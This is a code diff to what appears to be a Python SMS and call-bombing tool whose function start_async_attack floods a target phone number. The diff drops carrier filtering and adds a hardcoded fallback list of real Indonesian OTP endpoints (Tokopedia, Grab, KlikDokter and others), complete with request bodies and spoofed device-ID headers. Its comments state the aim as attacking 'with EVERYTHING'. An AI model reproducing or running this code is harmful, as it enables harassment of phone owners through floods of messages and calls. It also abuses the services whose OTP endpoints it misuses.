@@ -38,18 +38,35 @@ async def start_async_attack(apis, number, duration=60, concurrency=50, delay=0.
         print("🛑 Attack Cancelled due to Hardware Safety Protocols.")
         return
 
-    # Provider Detection (Simple)
-    provider = "all"
-    if number.startswith("081") or number.startswith("6281"): provider = "telkomsel"
-    elif number.startswith("089") or number.startswith("6289"): provider = "tri"
-    elif number.startswith("085") or number.startswith("6285"): provider = "indosat"
-    elif number.startswith("087") or number.startswith("6287"): provider = "xl"
+    # v1000000: UNIVERSAL MODE (HARDCODED FALLBACK)
+    FALLBACK_APIS = [
+      {"name": "[WA] KlikDokter", "url": "https://auth.klikdokter.com/api/v1/otp", "method": "POST", "provider": "all", "data": {"phone": "{c}", "channel": "wa"}},
+      {"name": "[SMS] Nutriclub", "url": "https://membership.nutriclub.co.id/api/otp/send", "method": "POST", "provider": "all", "data": {"phone": "{c}", "action": "registration"}},
+      {"name": "[SMS] PHD-Delivery", "url": "https://phd.co.id/en/users/sendOTP", "method": "POST", "provider": "all", "data": {"phone_number": "{c}"}},
+      {"name": "[CALL] Tokopedia-Voice", "url": "https://accounts.tokopedia.com/otp/c/page/request-otp-v2", "method": "POST", "provider": "all", "headers": {"X-Device-ID": "{random_device_id}", "X-Source": "android"}, "data": {"msisdn": "{c}", "otp_type": "112", "mode": "call"}},
+      {"name": "[CALL] Grab-Voice", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "provider": "all", "headers": {"X-Grab-Device-ID": "{random_device_id}"}, "data": {"phoneNumber": "{phone}", "countryCode": "ID", "method": "CALL"}},
+      {"name": "[SMS] Eraspace", "url": "https://api.eraspace.com/customer/v1/otp", "method": "POST", "provider": "all", "data": {"phone": "{c}", "otpType": "REGISTER"}},
+      {"name": "[SMS] Marugame", "url": "https://api.marugame.co.id/api/v1/auth/otp", "method": "POST", "provider": "all", "data": {"phoneNumber": "{phone}"}}
+    ]
+
+    # Universal Provider Logic (Ignored)
+    # We no longer filter by provider. We attack with EVERYTHING.
     
-    # Filter APIs
-    valid_apis = [api for api in apis if api.get("provider", "all") == "all" or api.get("provider") == provider]
+    # Filter APIs (UNIVERSAL MODE: BYPASS FILTER)
+    # valid_apis = [api for api in apis if api.get("provider", "all") == "all" or api.get("provider") == provider]
+    
+    # If apis list is empty or broken, use FALLBACK
+    if not apis:
+        print("⚠️ [SYSTEM] External APIs corrupt. Engaging HARDCODED FALLBACK (Universal Mode).")
+        valid_apis = FALLBACK_APIS
+    else:
+        # Use provided APIs but IGNORE provider filter (All are valid)
+        valid_apis = apis
+        print(f"🔥 [SYSTEM] Universal Mode Engaged. Target: {number}. Loaded {len(valid_apis)} APIs.")
     
     if not valid_apis:
-        print("⚠️ No APIs found.")
+        # Should be impossible now
+        print("⚠️ [CRITICAL] No APIs found even after Fallback.")
         return
 
     end_time = time.time() + duration
